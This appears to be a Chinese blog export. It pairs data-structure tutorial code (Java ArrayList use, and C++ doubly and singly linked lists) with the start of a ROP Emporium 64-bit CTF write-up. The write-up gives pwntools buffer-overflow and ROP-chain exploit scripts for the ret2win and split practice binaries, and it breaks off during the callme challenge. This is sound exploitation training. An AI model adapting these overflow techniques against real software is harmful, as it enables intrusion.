<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建动态数组</span></span><br><span class="line"><span class="comment">// 不用显式指定数组大小，它会根据实际存储的元素数量自动扩缩容</span></span><br><span class="line">ArrayList&lt;Integer&gt; arr = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    <span class="comment">// 在末尾追加元素，时间复杂度 O(1)</span></span><br><span class="line">    arr.<span class="keyword">add</span>(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在中间插入元素，时间复杂度 O(N)</span></span><br><span class="line"><span class="comment">// 在索引 2 的位置插入元素 666</span></span><br><span class="line">arr.<span class="keyword">add</span>(<span class="number">2</span>, <span class="number">666</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在头部插入元素，时间复杂度 O(N)</span></span><br><span class="line">arr.<span class="keyword">add</span>(<span class="number">0</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除末尾元素，时间复杂度 O(1)</span></span><br><span class="line">arr.<span class="keyword">remove</span>(arr.size() - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除中间元素，时间复杂度 O(N)</span></span><br><span class="line"><span class="comment">// 删除索引 2 的元素</span></span><br><span class="line">arr.<span class="keyword">remove</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据索引查询元素，时间复杂度 O(1)</span></span><br><span class="line"><span class="built_in">int</span> a = arr.<span class="keyword">get</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据索引修改元素，时间复杂度 O(1)</span></span><br><span class="line">arr.<span class="keyword">set</span>(<span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据元素值查找索引，时间复杂度 O(N)</span></span><br><span class="line"><span class="built_in">int</span> index = arr.indexOf(<span class="number">666</span>);</span><br></pre></td></tr></table></figure>
<h2 id="双向链表">2.双向链表</h2>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> DoublyListNode &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    DoublyListNode *<span class="keyword">next</span>, *prev;</span><br><span class="line">    DoublyListNode(<span class="keyword">int</span> x) : val(x), <span class="keyword">next</span>(<span class="keyword">NULL</span>), prev(<span class="keyword">NULL</span>) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">DoublyListNode* createDoublyLinkedList(vector&lt;<span class="keyword">int</span>&gt;&amp; arr) &#123;</span><br><span class="line">    <span class="keyword">if</span> (arr.empty()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    DoublyListNode* head = <span class="keyword">new</span> DoublyListNode(arr[<span class="number">0</span>]);</span><br><span class="line">    DoublyListNode* cur = head;</span><br><span class="line">    <span class="comment">// for 循环迭代创建双链表</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; arr.<span class="keyword">size</span>(); i++) &#123;</span><br><span class="line">        DoublyListNode* newNode = <span class="keyword">new</span> DoublyListNode(arr[i]);</span><br><span class="line">        cur-&gt;<span class="keyword">next</span> = newNode;</span><br><span class="line">        newNode-&gt;prev = cur;</span><br><span class="line">        cur = cur-&gt;<span class="keyword">next</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>完整代码</p>
<p>双链表</p>
<figure class="highlight zephir"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;stdexcept&gt;</span><br><span class="line"></span><br><span class="line">template&lt;typename E&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyLinkedList</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 虚拟头尾节点</span></span><br><span class="line">    struct Node &#123;</span><br><span class="line">        E val;</span><br><span class="line">        Node* next;</span><br><span class="line">        Node* prev;</span><br><span class="line"></span><br><span class="line">        Node(E value) : val(value), next(nullptr), prev(nullptr) &#123;&#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    Node* head;</span><br><span class="line">    Node* tail;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 构造函数初始化虚拟头尾节点</span></span><br><span class="line">    MyLinkedList() &#123;</span><br><span class="line">        head = <span class="keyword">new</span> Node(E());</span><br><span class="line">        tail = <span class="keyword">new</span> Node(E());</span><br><span class="line">        head-&gt;next = tail;</span><br><span class="line">        tail-&gt;prev = head;</span><br><span class="line">        size = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ***** 增 *****</span></span><br><span class="line"></span><br><span class="line">    void addLast(E e) &#123;</span><br><span class="line">        Node* x = <span class="keyword">new</span> Node(e);</span><br><span class="line">        Node* temp = tail-&gt;prev;</span><br><span class="line">        <span class="comment">// temp &lt;-&gt; x</span></span><br><span class="line">        temp-&gt;next = x;</span><br><span class="line">        x-&gt;prev = temp;</span><br><span class="line"></span><br><span class="line">        x-&gt;next = tail;</span><br><span class="line">        tail-&gt;prev = x;</span><br><span class="line">        <span class="comment">// temp &lt;-&gt; x &lt;-&gt; tail</span></span><br><span class="line">        size++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void addFirst(E e) &#123;</span><br><span class="line">        Node* x = <span class="keyword">new</span> Node(e);</span><br><span class="line">        Node* temp = head-&gt;next;</span><br><span class="line">        <span class="comment">// head &lt;-&gt; temp</span></span><br><span class="line">        temp-&gt;prev = x;</span><br><span class="line">        x-&gt;next = temp;</span><br><span class="line"></span><br><span class="line">        head-&gt;next = x;</span><br><span class="line">        x-&gt;prev = head;</span><br><span class="line">        <span class="comment">// head &lt;-&gt; x &lt;-&gt; temp</span></span><br><span class="line">        size++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void add(<span class="keyword">int</span> index, E element) &#123;</span><br><span class="line">        checkPositionIndex(index);</span><br><span class="line">        <span class="keyword">if</span> (index == size) &#123;</span><br><span class="line">            addLast(element);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 找到 index 对应的 Node</span></span><br><span class="line">        Node* p = getNode(index);</span><br><span class="line">        Node* temp = p-&gt;prev;</span><br><span class="line">        <span class="comment">// temp &lt;-&gt; p</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 新要插入的 Node</span></span><br><span class="line">        Node* x = <span class="keyword">new</span> Node(element);</span><br><span class="line"></span><br><span class="line">        p-&gt;prev = x;</span><br><span class="line">        temp-&gt;next = x;</span><br><span class="line"></span><br><span class="line">        x-&gt;prev = temp;</span><br><span class="line">        x-&gt;next = p;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// temp &lt;-&gt; x &lt;-&gt; p</span></span><br><span class="line"></span><br><span class="line">        size++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ***** 删 *****</span></span><br><span class="line"></span><br><span class="line">    E removeFirst() &#123;</span><br><span class="line">        <span class="keyword">if</span> (size &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> std::out_of_range(<span class="string">&quot;No elements to remove&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 虚拟节点的存在是我们不用考虑空指针的问题</span></span><br><span class="line">        Node* x = head-&gt;next;</span><br><span class="line">        Node* temp = x-&gt;next;</span><br><span class="line">        <span class="comment">// head &lt;-&gt; x &lt;-&gt; temp</span></span><br><span class="line">        head-&gt;next = temp;</span><br><span class="line">        temp-&gt;prev = head;</span><br><span class="line"></span><br><span class="line">        delete x;</span><br><span class="line">        <span class="comment">// head &lt;-&gt; temp</span></span><br><span class="line"></span><br><span class="line">        size--;</span><br><span class="line">        <span class="keyword">return</span> temp-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    E removeLast() &#123;</span><br><span class="line">        <span class="keyword">if</span> (size &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> std::out_of_range(<span class="string">&quot;No elements to remove&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Node* x = tail-&gt;prev;</span><br><span class="line">        Node* temp = tail-&gt;prev-&gt;prev;</span><br><span class="line">        <span class="comment">// temp &lt;-&gt; x &lt;-&gt; tail</span></span><br><span class="line"></span><br><span class="line">        tail-&gt;prev = temp;</span><br><span class="line">        temp-&gt;next = tail;</span><br><span class="line"></span><br><span class="line">        delete x;</span><br><span class="line">        <span class="comment">// temp &lt;-&gt; tail</span></span><br><span class="line"></span><br><span class="line">        size--;</span><br><span class="line">        <span class="keyword">return</span> temp-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    E remove(<span class="keyword">int</span> index) &#123;</span><br><span class="line">        checkElementIndex(index);</span><br><span class="line">        <span class="comment">// 找到 index 对应的 Node</span></span><br><span class="line">        Node* x = getNode(index);</span><br><span class="line">        Node* prev = x-&gt;prev;</span><br><span class="line">        Node* next = x-&gt;next;</span><br><span class="line">        <span class="comment">// prev &lt;-&gt; x &lt;-&gt; next</span></span><br><span class="line">        prev-&gt;next = next;</span><br><span class="line">        next-&gt;prev = prev;</span><br><span class="line"></span><br><span class="line">        delete x;</span><br><span class="line">        <span class="comment">// prev &lt;-&gt; next</span></span><br><span class="line"></span><br><span class="line">        size--;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> next-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ***** 查 *****</span></span><br><span class="line"></span><br><span class="line">    E get(<span class="keyword">int</span> index) &#123;</span><br><span class="line">        checkElementIndex(index);</span><br><span class="line">        <span class="comment">// 找到 index 对应的 Node</span></span><br><span class="line">        Node* p = getNode(index);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> p-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    E getFirst() &#123;</span><br><span class="line">        <span class="keyword">if</span> (size &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> std::out_of_range(<span class="string">&quot;No elements in the list&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> head-&gt;next-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    E getLast() &#123;</span><br><span class="line">        <span class="keyword">if</span> (size &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> std::out_of_range(<span class="string">&quot;No elements in the list&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> tail-&gt;prev-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ***** 改 *****</span></span><br><span class="line"></span><br><span class="line">    E set(<span class="keyword">int</span> index, E val) &#123;</span><br><span class="line">        checkElementIndex(index);</span><br><span class="line">        <span class="comment">// 找到 index 对应的 Node</span></span><br><span class="line">        Node* p = getNode(index);</span><br><span class="line"></span><br><span class="line">        E oldVal = p-&gt;val;</span><br><span class="line">        p-&gt;val = val;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> oldVal;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ***** 其他工具函数 *****</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> getSize() <span class="keyword">const</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">bool</span> isEmpty() <span class="keyword">const</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> size == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    Node* getNode(<span class="keyword">int</span> index) &#123;</span><br><span class="line">        checkElementIndex(index);</span><br><span class="line">        Node* p = head-&gt;next;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> 可以优化，通过 index 判断从 head 还是 tail 开始遍历</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; index; i++) &#123;</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">bool</span> isElementIndex(<span class="keyword">int</span> index) <span class="keyword">const</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> index &gt;= <span class="number">0</span> &amp;&amp; index &lt; size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">bool</span> isPositionIndex(<span class="keyword">int</span> index) <span class="keyword">const</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> index &gt;= <span class="number">0</span> &amp;&amp; index &lt;= size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查 index 索引位置是否可以存在元素</span></span><br><span class="line">    void checkElementIndex(<span class="keyword">int</span> index) <span class="keyword">const</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!isElementIndex(index))</span><br><span class="line">            <span class="keyword">throw</span> std::out_of_range(<span class="string">&quot;Index: &quot;</span> + std::to_string(index) + <span class="string">&quot;, Size: &quot;</span> + std::to_string(size));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查 index 索引位置是否可以添加元素</span></span><br><span class="line">    void checkPositionIndex(<span class="keyword">int</span> index) <span class="keyword">const</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!isPositionIndex(index))</span><br><span class="line">            <span class="keyword">throw</span> std::out_of_range(<span class="string">&quot;Index: &quot;</span> + std::to_string(index) + <span class="string">&quot;, Size: &quot;</span> + std::to_string(size));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    void display() &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;size = &quot;</span> &lt;&lt; size &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">for</span> (Node* p = head-&gt;next; p != tail; p = p-&gt;next) &#123;</span><br><span class="line">            std::cout &lt;&lt; p-&gt;val &lt;&lt; <span class="string">&quot; &lt;-&gt; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;null&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        std::cout &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ~MyLinkedList() &#123;</span><br><span class="line">        <span class="keyword">while</span> (size &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            removeFirst();</span><br><span class="line">        &#125;</span><br><span class="line">        delete head;</span><br><span class="line">        delete tail;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> main() &#123;</span><br><span class="line">    MyLinkedList&lt;<span class="keyword">int</span>&gt; list;</span><br><span class="line">    list.addLast(<span class="number">1</span>);</span><br><span class="line">    list.addLast(<span class="number">2</span>);</span><br><span class="line">    list.addLast(<span class="number">3</span>);</span><br><span class="line">    list.addFirst(<span class="number">0</span>);</span><br><span class="line">    list.add(<span class="number">2</span>, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">    list.display();</span><br><span class="line">    <span class="comment">// size = 5</span></span><br><span class="line">    <span class="comment">// 0 &lt;-&gt; 1 &lt;-&gt; 100 &lt;-&gt; 2 &lt;-&gt; 3 &lt;-&gt; null</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>单链表</p>
<figure class="highlight zephir"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;stdexcept&gt;</span><br><span class="line"></span><br><span class="line">template &lt;typename E&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyLinkedList2</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">// 节点结构</span></span><br><span class="line">    struct Node &#123;</span><br><span class="line">        E val;</span><br><span class="line">        Node* next;</span><br><span class="line"></span><br><span class="line">        Node(E value) : val(value), next(nullptr) &#123;&#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    Node* head;</span><br><span class="line">    <span class="comment">// 实际的尾部节点引用</span></span><br><span class="line">    Node* tail;</span><br><span class="line">    <span class="keyword">int</span> size_;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    MyLinkedList2() &#123;</span><br><span class="line">        head = <span class="keyword">new</span> Node(E());</span><br><span class="line">        tail = head;</span><br><span class="line">        size_ = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void addFirst(E e) &#123;</span><br><span class="line">        Node* newNode = <span class="keyword">new</span> Node(e);</span><br><span class="line">        newNode-&gt;next = head-&gt;next;</span><br><span class="line">        head-&gt;next = newNode;</span><br><span class="line">        <span class="keyword">if</span> (size_ == <span class="number">0</span>) &#123;</span><br><span class="line">            tail = newNode;</span><br><span class="line">        &#125;</span><br><span class="line">        size_++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void addLast(E e) &#123;</span><br><span class="line">        Node* newNode = <span class="keyword">new</span> Node(e);</span><br><span class="line">        tail-&gt;next = newNode;</span><br><span class="line">        tail = newNode;</span><br><span class="line">        size_++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void add(<span class="keyword">int</span> index, E element) &#123;</span><br><span class="line">        checkPositionIndex(index);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (index == size_) &#123;</span><br><span class="line">            addLast(element);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Node* prev = head;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; index; i++) &#123;</span><br><span class="line">            prev = prev-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        Node* newNode = <span class="keyword">new</span> Node(element);</span><br><span class="line">        newNode-&gt;next = prev-&gt;next;</span><br><span class="line">        prev-&gt;next = newNode;</span><br><span class="line">        size_++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    E removeFirst() &#123;</span><br><span class="line">        <span class="keyword">if</span> (isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> std::out_of_range(<span class="string">&quot;No elements to remove&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Node* first = head-&gt;next;</span><br><span class="line">        head-&gt;next = first-&gt;next;</span><br><span class="line">        <span class="keyword">if</span> (size_ == <span class="number">1</span>) &#123;</span><br><span class="line">            tail = head;</span><br><span class="line">        &#125;</span><br><span class="line">        size_--;</span><br><span class="line">        E val = first-&gt;val;</span><br><span class="line">        delete first;</span><br><span class="line">        <span class="keyword">return</span> val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    E removeLast() &#123;</span><br><span class="line">        <span class="keyword">if</span> (isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> std::out_of_range(<span class="string">&quot;No elements to remove&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Node* prev = head;</span><br><span class="line">        <span class="keyword">while</span> (prev-&gt;next != tail) &#123;</span><br><span class="line">            prev = prev-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        E val = tail-&gt;val;</span><br><span class="line">        delete tail;</span><br><span class="line">        prev-&gt;next = nullptr;</span><br><span class="line">        tail = prev;</span><br><span class="line">        size_--;</span><br><span class="line">        <span class="keyword">return</span> val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    E remove(<span class="keyword">int</span> index) &#123;</span><br><span class="line">        checkElementIndex(index);</span><br><span class="line"></span><br><span class="line">        Node* prev = head;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; index; i++) &#123;</span><br><span class="line">            prev = prev-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Node* nodeToRemove = prev-&gt;next;</span><br><span class="line">        prev-&gt;next = nodeToRemove-&gt;next;</span><br><span class="line">        <span class="comment">// 删除的是最后一个元素</span></span><br><span class="line">        <span class="keyword">if</span> (index == size_ - <span class="number">1</span>) &#123;</span><br><span class="line">            tail = prev;</span><br><span class="line">        &#125;</span><br><span class="line">        size_--;</span><br><span class="line">        E val = nodeToRemove-&gt;val;</span><br><span class="line">        delete nodeToRemove;</span><br><span class="line">        <span class="keyword">return</span> val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ***** 查 *****</span></span><br><span class="line"></span><br><span class="line">    E getFirst() &#123;</span><br><span class="line">        <span class="keyword">if</span> (isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> std::out_of_range(<span class="string">&quot;No elements in the list&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> head-&gt;next-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    E getLast() &#123;</span><br><span class="line">        <span class="keyword">if</span> (isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> std::out_of_range(<span class="string">&quot;No elements in the list&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> getNode(size_ - <span class="number">1</span>)-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    E get(<span class="keyword">int</span> index) &#123;</span><br><span class="line">        checkElementIndex(index);</span><br><span class="line">        Node* p = getNode(index);</span><br><span class="line">        <span class="keyword">return</span> p-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ***** 改 *****</span></span><br><span class="line"></span><br><span class="line">    E set(<span class="keyword">int</span> index, E element) &#123;</span><br><span class="line">        checkElementIndex(index);</span><br><span class="line">        Node* p = getNode(index);</span><br><span class="line"></span><br><span class="line">        E oldVal = p-&gt;val;</span><br><span class="line">        p-&gt;val = element;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> oldVal;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ***** 其他工具函数 *****</span></span><br><span class="line">    <span class="keyword">int</span> size() &#123;</span><br><span class="line">        <span class="keyword">return</span> size_;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">bool</span> isEmpty() &#123;</span><br><span class="line">        <span class="keyword">return</span> size_ == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">bool</span> isElementIndex(<span class="keyword">int</span> index) &#123;</span><br><span class="line">        <span class="keyword">return</span> index &gt;= <span class="number">0</span> &amp;&amp; index &lt; size_;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">bool</span> isPositionIndex(<span class="keyword">int</span> index) &#123;</span><br><span class="line">        <span class="keyword">return</span> index &gt;= <span class="number">0</span> &amp;&amp; index &lt;= size_;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查 index 索引位置是否可以存在元素</span></span><br><span class="line">    void checkElementIndex(<span class="keyword">int</span> index) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!isElementIndex(index)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> std::out_of_range(<span class="string">&quot;Index: &quot;</span> + std::to_string(index) + <span class="string">&quot;, size_: &quot;</span> + std::to_string(size_));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查 index 索引位置是否可以添加元素</span></span><br><span class="line">    void checkPositionIndex(<span class="keyword">int</span> index) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!isPositionIndex(index)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> std::out_of_range(<span class="string">&quot;Index: &quot;</span> + std::to_string(index) + <span class="string">&quot;, size_: &quot;</span> + std::to_string(size_));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回 index 对应的 Node</span></span><br><span class="line">    <span class="comment">// 注意：请保证传入的 index 是合法的</span></span><br><span class="line">    Node* getNode(<span class="keyword">int</span> index) &#123;</span><br><span class="line">        Node* p = head-&gt;next;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; index; i++) &#123;</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> main() &#123;</span><br><span class="line">    MyLinkedList2&lt;<span class="keyword">int</span>&gt; list;</span><br><span class="line">    list.addFirst(<span class="number">1</span>);</span><br><span class="line">    list.addFirst(<span class="number">2</span>);</span><br><span class="line">    list.addLast(<span class="number">3</span>);</span><br><span class="line">    list.addLast(<span class="number">4</span>);</span><br><span class="line">    list.add(<span class="number">2</span>, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; list.removeFirst() &lt;&lt; std::endl; <span class="comment">// 2</span></span><br><span class="line">    std::cout &lt;&lt; list.removeLast() &lt;&lt; std::endl; <span class="comment">// 4</span></span><br><span class="line">    std::cout &lt;&lt; list.remove(<span class="number">1</span>) &lt;&lt; std::endl; <span class="comment">// 5</span></span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; list.getFirst() &lt;&lt; std::endl; <span class="comment">// 1</span></span><br><span class="line">    std::cout &lt;&lt; list.getLast() &lt;&lt; std::endl; <span class="comment">// 3</span></span><br><span class="line">    std::cout &lt;&lt; list.get(<span class="number">1</span>) &lt;&lt; std::endl; <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2025/02/14/ROP%20Emporium%EF%BC%8864%EF%BC%89%20WP/</url>
    <content><![CDATA[<h1 id="rop-emporium64-wp">ROP Emporium（64） WP</h1>
<h2 id="ret2win">1.ret2win</h2>
<p>找到后门函数ret2win的地址，利用缓冲区溢出覆盖返回地址</p>
<p>exp</p>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ret2win&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b<span class="string">&#x27;&gt; &#x27;</span>, cyclic(<span class="number">40</span>) + p64(<span class="number">0x400756</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="split">2.split</h2>
<p>与ret2win大致相同，只不过这题将后门执行的命令由<code>cat flag</code>改为了<code>/bin/ls</code>，因此不能直接获取flag，但程序中给出了<code>/bin/cat flag.txt</code>这个字符串，所以只需要构造简单的ROP链就可以获取flag<img
src="https://p.sda1.dev/22/d0fbba4df9c580e19acafa6f97dde4a1/image-20250214095002976.png"
alt="image-20250214095002976.png" /><img
src="https://p.sda1.dev/22/a535261d95bc230a50941ba1fb3ea46b/image-20250214095031390.png"
alt="image-20250214095031390.png" />直接使用gadget将参数pop到rdi中即可。</p>
<p>exp</p>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./split&#x27;</span>)</span><br><span class="line"></span><br><span class="line">useful_string = <span class="number">0x601060</span></span><br><span class="line">rdi = <span class="number">0x4007c3</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./split&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = b<span class="string">&#x27;a&#x27;</span>*(<span class="number">32</span> + <span class="number">8</span>) + p64(rdi) + p64(useful_string) + p64(elf.plt[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b<span class="string">&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="callme">3.callme</h2>
<p>与第二题类似，通过ROPgadget找到对应gadget地址为0x40093c。<img
src="https://p.sda1.dev/22/1cb41ee50c7c5fcaeaa5e33ef07c56c9/image-20250214100130272.png" />题目里的usefulfunction也给了提示，就是让我们连续调用三个函数，并用正确的顺序和参数调用<img
src="https://p.sda1.dev/22/10ea289a8a1c2305ecd3385d744cba2a/image-20250214101459928.png" /></p>
<p>然后直接构造payload即可</p>
<p>exp</p>
